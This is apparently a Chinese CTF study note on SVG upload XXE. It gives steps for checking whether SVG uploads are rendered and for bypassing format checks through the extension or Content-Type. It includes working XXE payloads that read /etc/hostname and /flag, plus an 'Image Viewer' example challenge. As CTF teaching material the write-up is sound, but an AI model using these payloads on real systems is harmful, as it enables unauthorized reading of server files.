# svg+xxe文件上传

准备两个文件：

**(1) 正常 jpg：**

`1.jpg`（随便找张）

**(2) 正常 svg：**

`2.svg`：

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="50">
  <text x="10" y="20">svg-test</text>
</svg>
```

通过浏览器正常上传，看 `2.svg` 的结果：

- ✅ 能预览 / 能被当图看：
   → 后端/前端接受并渲染 SVG。
   → **可以继续往 XXE 或 XSS 方向走**。
- ❌ 提示“不支持格式”、“不是图片”：
   → 说明前端/后端有明确阻止 svg，需要考虑：
  - 改扩展名绕过；
  - Content-Type 绕过；
  - 或者这题压根不是走 svg 方向。

![image-20251201213357712](../../AppData/Roaming/Typora/typora-user-images/image-20251201213357712.png)

### 如果 svg 能用(如图)，再试探 XXE

把刚才的 `2.svg` 升级为 XXE 版本，比如先试一个“不敏感”的：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="50">//大小根据flag的长短可以调整
  <text x="10" y="20">&xxe;</text>
</svg>
```

上传后：

- 如果**在页面上预览的文字变成了一串主机名/奇怪内容** → 基本确认 XXE 成功。
- 如果没变化 / 报错：
  - 可能是解析库禁用了外部实体；
  - 或者服务端根本没有对 SVG 做 XML 解析（只是当静态文件返回）。

确认 `/etc/hostname` 成功后，就可以把 `file:///etc/hostname` 换成 `file:///flag`，形成CTF题里面那种 payload。

![image-20251201213450395](../../AppData/Roaming/Typora/typora-user-images/image-20251201213450395.png)

# 例题：

## Image Viewer

随便上传一个图片文件，发现图片内容被解析成base64字符串

![image-20251201211427944](../../AppData/Roaming/Typora/typora-user-images/image-20251201211427944.png)

构造一个恶意的svg图片让服务器解析

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE note [ <!ENTITY file SYSTEM "file:///flag" > ]> <svg height="100" width="1000"> <text x="10" y="20">&file;</text> </svg>
```

![image-20251201211448600](../../AppData/Roaming/Typora/typora-user-images/image-20251201211448600.png)

